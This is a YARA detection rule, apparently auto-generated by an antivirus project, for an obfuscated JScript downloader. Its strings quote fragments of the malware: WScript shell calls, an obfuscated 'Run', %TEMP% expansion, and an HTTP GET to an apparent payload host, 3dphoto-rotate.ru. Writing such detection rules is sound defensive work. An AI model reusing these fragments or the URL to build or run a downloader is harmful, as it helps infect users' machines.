rule sig_20160428_6eb24553065aeb8fe655ed120d260abe {
  meta:
    description = "datamaliciousorder - file 20160428_6eb24553065aeb8fe655ed120d260abe.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "81766a20293c6cd5e8c892622fdeb7817ae8ce445e3d6e1b38bd8c0571ad841e"

  strings:
    $s1  = "function IppUqmZtwXokEovMqjOzd(LrdUnxPhwGghShmVtqRwd){KzpIrtVpiWnxSvkRyoWtd[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function DqiGrqXvjZvmTeqWlbAht() {return KzpIrtVpiWnxSvkRyoWtd[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function IppUqmZtwXokEovMqjOzd(LrdUnxPhwGghShmVtqRwd){KzpIrtVpiWnxSvkRyoWtd[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function InnKvjFsaEkcSxvZykKga(IsxVbzBdbEpmBtrRgkSza, GhgAryBwbJyjOgsTsgTse){AdnPxrHewVvmSboRofFfa = AdnPxrHewVvmSboRofFfa * 1; " ascii
    $s5  = "return IsxVbzBdbEpmBtrRgkSza - GhgAryBwbJyjOgsTsgTse;};" fullword ascii
    $s6  = "ShuAmdZtzGjiRaaClsUty[GdiMycLygLbaXciNisBac](\"G\" + \"ET\", \"http://3dphoto-rotate.ru/h4ydjs\", false);" fullword ascii
    $s7  = "var KzpIrtVpiWnxSvkRyoWtd = function GxdPigVauMwcOxwRsaCfg() {return HcfKraUpiExvUgrWztDto[JhrQuyUitUeeAsoHzqBfu](\"WScript\"+\"" ascii
    $s8  = "var HcfKraUpiExvUgrWztDto = this[\"WScript\"];" fullword ascii
    $s9  = "function DqiGrqXvjZvmTeqWlbAht() {return KzpIrtVpiWnxSvkRyoWtd[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s10 = "function InnKvjFsaEkcSxvZykKga(IsxVbzBdbEpmBtrRgkSza, GhgAryBwbJyjOgsTsgTse){AdnPxrHewVvmSboRofFfa = AdnPxrHewVvmSboRofFfa * 1; " ascii
    $s11 = "if (ShuAmdZtzGjiRaaClsUty[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s12 = "var KzpIrtVpiWnxSvkRyoWtd = function GxdPigVauMwcOxwRsaCfg() {return HcfKraUpiExvUgrWztDto[JhrQuyUitUeeAsoHzqBfu](\"WScript\"+\"" ascii
    $s13 = "function XdaMskJjqNpqBbwSysXsg(){return EimZgnFikUqgUdwVlbAvu + \"\";};" fullword ascii
    $s14 = "function VrkUanWyvWouPbfTjbVsp() {return ((AcrNwhQihQpuTrtEriJks == true) && (AcrNwhQihQpuTrtEriJks == DqpQnsYkdTytGmhOukIoi)) ?" ascii
    $s15 = "function VrkUanWyvWouPbfTjbVsp() {return ((AcrNwhQihQpuTrtEriJks == true) && (AcrNwhQihQpuTrtEriJks == DqpQnsYkdTytGmhOukIoi)) ?" ascii
    $s16 = "var JyyIwxWbqBtlIepIdqFfx = new this[\"D\"+\"ate\"]();" fullword ascii
    $s17 = "function QodHysGbxZfzKhpIysMgv(DzzOrmNwmSfzEetYyjKke) {var YyrNmgOjoJzjOasWaeEzq = (1, 2, 3, 4, 5, DzzOrmNwmSfzEetYyjKke); retur" ascii
    $s18 = "function QodHysGbxZfzKhpIysMgv(DzzOrmNwmSfzEetYyjKke) {var YyrNmgOjoJzjOasWaeEzq = (1, 2, 3, 4, 5, DzzOrmNwmSfzEetYyjKke); retur" ascii
    $s19 = "AcrNwhQihQpuTrtEriJks = true; " fullword ascii
    $s20 = "function PbcGrtNylCtvYmbDazCuw()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}